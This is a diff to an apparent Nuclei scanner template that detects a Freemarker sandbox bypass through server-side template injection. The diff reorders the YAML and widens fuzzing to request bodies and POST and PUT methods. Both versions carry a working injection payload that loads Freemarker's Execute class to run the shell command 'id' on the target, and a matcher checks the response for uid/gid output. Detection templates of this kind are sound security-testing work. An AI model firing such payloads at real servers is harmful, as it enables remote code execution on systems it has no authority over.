@@ -1,5 +1,4 @@
 id: freemarker-sandbox-bypass-ssti
-
 info:
   name: Freemarker < 2.3.30 Sandbox Bypass - Server Side Template Injection
   author: ritikchaddha
@@ -10,28 +9,29 @@ info:
     - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Java.md#freemarker---sandbox-bypass
   metadata:
     verified: true
-  tags: ssti,dast,freemarker,vuln
-
+  tags: dast,freemarker,ssti,vuln
 http:
-  - pre-condition:
-      - type: dsl
-        dsl:
-          - 'method == "GET"'
+  - fuzzing:
+      - fuzz:
+          - '{{injection}}'
+        mode: single
+        parts:
+          - query
+          - body
+        type: replace
+    matchers:
+      - part: body
+        regex:
+          - uid=[0-9]+.*gid=[0-9]+.*
+        # digest: 4a0a00473045022100e529f042303de7a5b33b08969b1cb6aacab4a89e725204f7271958c3c0e81e8102200914fa91d3deb89a05f540d02eed714884a2b3384194df269ba4510d62546fb9:922c64590222798bb761d5b6d8e72950
 
+        type: regex
     payloads:
       injection:
-        - "<#assign%20classloader=article.class.protectionDomain.classLoader><#assign%20owc=classloader.loadClass(%22freemarker.template.ObjectWrapper%22)><#assign%20dwf=owc.getField(%22DEFAULT_WRAPPER%22).get(null)><#assign%20ec=classloader.loadClass(%22freemarker.template.utility.Execute%22)>${dwf.newInstance(ec,null)(%22id%22)}"
-
-    fuzzing:
-      - part: query
-        type: replace
-        mode: single
-        fuzz:
-          - "{{injection}}"
-
-    matchers:
-      - type: regex
-        part: body
-        regex:
-          - "uid=[0-9]+.*gid=[0-9]+.*"
-# digest: 4a0a00473045022100ac8c10f30a5cdc7e823e21020c162e3905bb3224dc545e42d0af472fe3b9cc3802204b4d959cdab058adf6963fdb8f84eeb01e420b56b927cd2f3a6b9041ec60a4cd:922c64590222798bb761d5b6d8e72950
+        - <#assign%20classloader=article.class.protectionDomain.classLoader><#assign%20owc=classloader.loadClass(%22freemarker.template.ObjectWrapper%22)><#assign%20dwf=owc.getField(%22DEFAULT_WRAPPER%22).get(null)><#assign%20ec=classloader.loadClass(%22freemarker.template.utility.Execute%22)>${dwf.newInstance(ec,null)(%22id%22)}
+    pre-condition:
+      - dsl:
+          - method == "GET"
+          - method == "POST"
+          - method == "PUT"
+        type: dsl
